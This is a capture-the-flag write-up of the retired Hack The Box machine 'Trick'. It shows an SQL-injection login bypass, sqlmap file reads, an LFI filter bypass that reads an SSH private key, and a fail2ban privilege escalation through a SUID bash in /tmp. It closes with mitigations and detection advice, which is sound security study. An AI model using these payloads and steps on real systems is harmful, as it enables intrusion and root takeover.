---
machine: Trick
os: Linux
difficulty: Easy
platform: Hack The Box
category: Machines
state: Retired
tags: [linux, dns, sqli, lfi, fail2ban]
---

# Trick — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired, publishable note.
> Reference note based on public documentation and technical writeups. No real flags or credentials.

## TL;DR

The box exposes DNS, SMTP and Nginx. A zone transfer reveals `preprod-payroll.trick.htb`, a portal with an SQL injection that allows authentication bypass and file reads. Nginx's configuration reveals a second vhost, `preprod-marketing.trick.htb`, with an LFI that strips `../`. The `....//` bypass reads `michael`'s SSH key. `michael` can restart `fail2ban` as root and belongs to the `security` group, which owns `action.d`; editing `actionban` and triggering a ban runs commands as root.

## Recon

```bash
nmap -p- --min-rate 10000 -sV -sC <IP> -oN nmap.txt
```

```text
22/tcp  ssh    OpenSSH 7.9p1 Debian
25/tcp  smtp   Postfix
53/tcp  domain ISC BIND 9.11.5-P4
80/tcp  http   nginx 1.14.2
```

A reverse DNS lookup returns `trick.htb`. Add it to the hosts file together with any vhosts found later.

## Enumeration

```bash
dig @trick.htb trick.htb AXFR
```

The zone transfer returns `preprod-payroll.trick.htb`. The portal shows a payroll management login.

```bash
wfuzz -u http://trick.htb -H 'Host: preprod-FUZZ.trick.htb' \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 5480
```

## Foothold

The login is vulnerable to an authentication SQL injection (**CVE-2022-28468**):

```text
username: ' OR 1=1-- -
password: any value
```

`sqlmap` confirms the injection and reads files. Nginx's configuration reveals another vhost's docroot:

```bash
sqlmap -r login.req --batch --file-read=/etc/nginx/sites-enabled/default
```

The second site is `preprod-marketing.trick.htb`. Its `index.php` includes `page` and removes `../` with `str_replace`, once. The `....//` sequence rebuilds the traversal after the filter:

```text
http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//home/michael/.ssh/id_rsa
```

Copy the private key, fix its permissions and log in over SSH as `michael`. An alternative is mail or Nginx log poisoning plus the LFI to execute PHP.

## Lateral movement

`michael` is the final web user; no pivot is required. Local enumeration checks permissions and groups:

```bash
id
sudo -l
find / -group security 2>/dev/null
```

```text
uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security)
(root) NOPASSWD: /etc/init.d/fail2ban restart
/etc/fail2ban/action.d
```

## Privilege escalation

`/etc/fail2ban/action.d` is writable by the `security` group. The SSH jail's default action is `iptables-multiport`, whose `actionban` runs as root when an IP reaches the failure threshold.

Replace `actionban` with a command that creates a SUID copy of bash:

```text
actionban = cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash
```

Restart the service with the sudo permission and trigger five failed SSH logins to fire the ban:

```bash
sudo /etc/init.d/fail2ban restart
ssh baduser@trick.htb   # repeat until banned
/tmp/rootbash -p
```

The shell keeps root's euid. The key is that `fail2ban` runs the action with its privileges while the user controls the action file.

## Evidence

- `dig AXFR` output with the vhosts.
- The SQLi request and the read of `/etc/nginx/sites-enabled/default`.
- `sudo -l` and `ls -ld /etc/fail2ban/action.d`.
- `id` from inside `/tmp/rootbash -p`.

## Lessons learned

- DNS zone transfers remain a source of vhosts in labs and poorly segmented networks.
- Filters that remove `../` once are bypassed with `....//`.
- A `sudo` rule to restart a service is dangerous when the user can modify its configuration.
- Membership in a group with write access to `action.d` turns `fail2ban` into root execution.

## Mitigations and detection

- **Fix:** restrict AXFR to secondary servers; parameterise SQL queries; use `realpath` and a template allowlist; do not let `michael` write to `action.d`; review sudo rules over services.
- **Detection:** AXFR queries from unauthorised hosts; login attempts containing quotes and SQL comments; reads of `id_rsa` or Nginx's configuration; changes under `action.d` and `fail2ban` restarts; SUID binaries created in `/tmp`.
- MITRE ATT&CK: T1590.002 (DNS), T1190 (exploit public-facing application), T1548.001 (setuid/setgid), T1543.002 (systemd service).

## References

- <https://www.hackthebox.com/machines/trick>
- <https://0xdf.gitlab.io/2022/10/29/htb-trick.html>
- <https://nvd.nist.gov/vuln/detail/CVE-2022-28468>
- <https://github.com/fail2ban/fail2ban/wiki>
